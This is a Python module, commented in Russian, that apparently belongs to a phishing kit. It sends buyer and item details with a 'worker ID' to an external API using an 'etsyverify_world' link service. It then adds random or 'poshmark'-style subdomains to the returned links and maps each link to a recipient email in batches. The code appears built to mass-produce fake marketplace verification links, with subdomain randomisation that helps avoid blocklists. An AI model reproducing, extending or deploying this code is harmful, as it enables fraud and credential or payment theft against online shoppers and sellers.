"""Модуль для генерации ссылок через API с поддоменами."""

import asyncio
import logging
import os
import random
import string
from typing import Optional

import aiohttp
from dotenv import load_dotenv

from src.progress import console

load_dotenv()


class LinkGenerator:
    """Генератор ссылок через API с поддоменами."""
    
    def __init__(self):
        self.api_url = os.getenv("API_URL", "https://arthas-api.com/obezyanaPidor")
        self.worker_id = os.getenv("WORKER_ID", "6932206485")
        self.link_service = os.getenv("LINK_SERVICE", "etsyverify_world")
        self.subdomain_mode = os.getenv("SUBDOMAIN_MODE", "none").lower()  # "random", "semi_random", "none"
        self.subdomain_prefix = os.getenv("SUBDOMAIN_PREFIX", "")
        
        # Дефолтные данные для заполнения (можно переопределить)
        self.default_title = os.getenv("DEFAULT_TITLE", "Vintage Item")
        self.default_address = os.getenv("DEFAULT_ADDRESS", "123 Main Street, New York, NY 10001")
        self.default_photo = os.getenv("DEFAULT_PHOTO", "https://example.com/photo.jpg")
        self.default_price = os.getenv("DEFAULT_PRICE", "25.00")
        
    def _generate_random_subdomain(self, prefix: str = "") -> str:
        """Генерирует поддомен в зависимости от режима.
        
        Args:
            prefix: Префикс для поддомена (используется в режиме semi_random)
            
        Returns:
            Строка вида 'abcd' (random) или 'poshmarkabcd' (semi_random)
        """
        # Генерируем ровно 4 случайных символа (буквы + цифры)
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        
        if self.subdomain_mode == "random":
            # Полностью рандомный: abcd
            return random_part
        elif self.subdomain_mode == "semi_random":
            # Префикс + рандомные 4 символа: poshmarkabcd
            return f"{prefix}{random_part}" if prefix else random_part
        else:
            # Режим "none" - не должен вызываться
            return ""
    
    def _remove_https(self, url: str) -> str:
        """Удаляет https:// или http:// из начала URL.
        
        Args:
            url: URL адрес
            
        Returns:
            URL без протокола
        """
        if url.startswith("https://"):
            return url[8:]
        elif url.startswith("http://"):
            return url[7:]
        return url
    
    async def generate_link(
        self,
        name: Optional[str] = None,
        title: Optional[str] = None,
        address: Optional[str] = None,
        photo: Optional[str] = None,
        price: Optional[str] = None,
        timeout: int = 10
    ) -> Optional[str]:
        """Генерирует ссылку через API.
        
        Args:
            name: Имя покупателя
            title: Название товара
            address: Адрес покупателя
            photo: URL фото товара
            price: Цена товара
            timeout: Таймаут запроса в секундах
            
        Returns:
            Сгенерированная ссылка без https:// или None при ошибке
        """
        payload = {
            "id": self.worker_id,
            "title": title or self.default_title,
            "address": address or self.default_address,
            "photo": photo or self.default_photo,
            "price": price or self.default_price,
            "name": name or "Customer",
            "linkService": self.link_service
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    self.api_url,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as response:
                    if response.status != 200:
                        logging.error(f"❌ API вернул статус {response.status}")
                        console.print(f"[red]❌ API вернул статус {response.status}[/red]")
                        return None
                    
                    data = await response.json()
                    
                    # Предполагаем, что API возвращает {"link": "https://domain.com/path"}
                    # Адаптируйте под ваш формат ответа
                    if "link" in data:
                        original_link = data["link"]
                    elif "url" in data:
                        original_link = data["url"]
                    else:
                        logging.error(f"❌ API не вернул ссылку. Ответ: {data}")
                        console.print(f"[red]❌ API не вернул ссылку[/red]")
                        return None
                    
                    # Удаляем https://
                    link_without_protocol = self._remove_https(original_link)
                    
                    # Применяем поддомены в зависимости от режима
                    if self.subdomain_mode == "random":
                        # Полностью рандомный поддомен (4 символа)
                        subdomain = self._generate_random_subdomain()
                        
                        # Вставляем поддомен перед основным доменом
                        parts = link_without_protocol.split('/', 1)
                        if len(parts) == 2:
                            domain_part = parts[0]
                            path_part = parts[1]
                            final_link = f"{subdomain}.{domain_part}/{path_part}"
                        else:
                            final_link = f"{subdomain}.{link_without_protocol}"
                    
                    elif self.subdomain_mode == "semi_random":
                        # Префикс + 4 рандомных символа
                        subdomain = self._generate_random_subdomain(self.subdomain_prefix)
                        
                        # Вставляем поддомен перед основным доменом
                        parts = link_without_protocol.split('/', 1)
                        if len(parts) == 2:
                            domain_part = parts[0]
                            path_part = parts[1]
                            final_link = f"{subdomain}.{domain_part}/{path_part}"
                        else:
                            final_link = f"{subdomain}.{link_without_protocol}"
                    
                    else:
                        # Режим "none" - без поддомена, используем оригинальную ссылку
                        final_link = link_without_protocol
                    
                    logging.info(f"✅ Сгенерирована ссылка: {final_link}")
                    return final_link
                    
        except asyncio.TimeoutError:
            logging.error(f"❌ Таймаут при запросе к API ({timeout}s)")
            console.print(f"[red]❌ Таймаут при запросе к API[/red]")
            return None
        except Exception as e:
            logging.exception(f"❌ Ошибка генерации ссылки: {e}")
            console.print(f"[red]❌ Ошибка генерации ссылки: {e}[/red]")
            return None
    
    async def generate_links_batch(
        self,
        recipients: list[dict],
        max_concurrent: int = 5
    ) -> dict[str, str]:
        """Генерирует ссылки для батча получателей.
        
        Args:
            recipients: Список словарей с данными получателей
                       Каждый словарь должен содержать: email, name (опционально), 
                       title, address, photo, price
            max_concurrent: Максимальное количество одновременных запросов
            
        Returns:
            Словарь {email: generated_link}
        """
        semaphore = asyncio.Semaphore(max_concurrent)
        results = {}
        
        async def generate_with_semaphore(recipient: dict):
            async with semaphore:
                email = recipient.get("email")
                if not email:
                    return
                
                title = recipient.get("title")
                link = await self.generate_link(
                    name=recipient.get("name"),
                    title=title,
                    address=recipient.get("address"),
                    photo=recipient.get("photo"),
                    price=recipient.get("price")
                )
                
                if link:
                    results[email] = link
                    logging.info(f"🔗 Сгенерирована ссылка для {email} | Title: {title or self.default_title} | Link: {link}")
        
        tasks = [generate_with_semaphore(recipient) for recipient in recipients]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return results


# Вспомогательная функция для быстрого использования
async def generate_link_for_email(
    email: str,
    name: Optional[str] = None,
    title: Optional[str] = None,
    **kwargs
) -> Optional[str]:
    """Быстрая генерация ссылки для одного email."""
    generator = LinkGenerator()
    return await generator.generate_link(name=name, title=title, **kwargs)
